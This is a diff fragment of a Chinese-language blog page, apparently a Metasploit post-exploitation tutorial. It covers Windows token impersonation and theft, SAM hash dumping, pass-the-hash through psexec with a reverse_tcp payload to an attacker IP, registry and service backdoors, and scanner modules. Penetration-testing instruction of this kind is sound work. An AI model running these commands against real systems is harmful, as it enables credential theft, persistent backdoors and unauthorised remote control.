-<h3 id="0x12-令牌操纵"><a href="#0x12-令牌操纵" class="headerlink" title="0x12.令牌操纵"></a>0x12.令牌操纵</h3><h4 id="1-incognito假冒令牌"><a href="#1-incognito假冒令牌" class="headerlink" title="1)incognito假冒令牌"></a>1)incognito假冒令牌</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &apos;NT AUTHORITY\SYSTEM&apos;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fdf8654-998c-1.png" alt=""></p>
-<h4 id="2-steal-token窃取令牌"><a href="#2-steal-token窃取令牌" class="headerlink" title="2)steal_token窃取令牌"></a>2)steal_token窃取令牌</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fee2862-998c-1.png" alt=""></p>
-<h3 id="0x13-哈希利用"><a href="#0x13-哈希利用" class="headerlink" title="0x13.哈希利用"></a>0x13.哈希利用</h3><h4 id="1-获取哈希"><a href="#1-获取哈希" class="headerlink" title="1)获取哈希"></a>1)获取哈希</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump  #从SAM导出密码哈希</span><br><span class="line">#需要SYSTEM权限</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8ffec58c-998c-1.png" alt=""></p>
-<h4 id="2-PSExec哈希传递"><a href="#2-PSExec哈希传递" class="headerlink" title="2)PSExec哈希传递"></a>2)PSExec哈希传递</h4><p>通过smart_hashdump获取用户哈希后，可以利用psexec模块进行哈希传递攻击<br>前提条件：①开启445端口 smb服务；②开启admin$共享<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 443</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt;set SMBUser Administrator</span><br><span class="line">msf &gt;set SMBPass aad3b4*****04ee:5b5f00*****c424c</span><br><span class="line">msf &gt;set SMBDomain  WORKGROUP   #域用户需要设置SMBDomain</span><br><span class="line">msf &gt;exploit</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-900da246-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-901e3d36-998c-1.png" alt=""></p>
-<h3 id="0x14-后门植入"><a href="#0x14-后门植入" class="headerlink" title="0x14.后门植入"></a>0x14.后门植入</h3><p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
-<h4 id="1-persistence启动项后门"><a href="#1-persistence启动项后门" class="headerlink" title="1)persistence启动项后门"></a>1)persistence启动项后门</h4><p>在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本<br>在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  #查看帮助</span><br><span class="line">run persistence -X -i 5 -p 6661 -r 192.168.159.134</span><br><span class="line">#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-902cd47c-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-9041d688-998c-1.png" alt=""></p>
-<p><strong>连接后门</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; set LHOST 192.168.159.134</span><br><span class="line">msf &gt; set LPORT 6661</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9051352e-998c-1.png" alt=""></p>
-<h4 id="2-metsvc服务后门"><a href="#2-metsvc服务后门" class="headerlink" title="2)metsvc服务后门"></a>2)metsvc服务后门</h4><p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run metsvc –h   # 查看帮助</span><br><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9060162a-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-9077bb4a-998c-1.png" alt=""></p>
-<p><strong>连接后门</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/metsvc_bind_tcp</span><br><span class="line">msf &gt; set RHOST 192.168.159.144</span><br><span class="line">msf &gt; set LPORT 31337</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232243-90b333b4-998c-1.png" alt=""></p>
-<h3 id="0x15-扫描脚本"><a href="#0x15-扫描脚本" class="headerlink" title="0x15.扫描脚本"></a>0x15.扫描脚本</h3><p>扫描的脚本位于：<br>/usr/share/metasploit-framework/modules/auxiliary/scanner/<br>扫描的脚本较多，仅列几个代表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br><span class="line">use auxiliary/scanner/mysql/mysql_version</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br></pre></td></tr></table></figure></p>
-<p><strong>参考:</strong><br><a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/" target="_blank" rel="noopener">https://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/</a><br><a href="https://thehacktoday.com/metasploit-commands/" target="_blank" rel="noopener">https://thehacktoday.com/metasploit-commands/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/fun-incognito/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/persistent-netcat-backdoor/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/</a><br><a href="http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/" target="_blank" rel="noopener">http://www.hackingarticles.in/7-ways-to-privilege-escalation-of-windows-7-pc-bypass-uac/</a><br><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</a><br><a href="http://wooyun.jozxing.cc/static/drops/tips-2227.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/drops/tips-2227.html</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2054,7 +1997,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
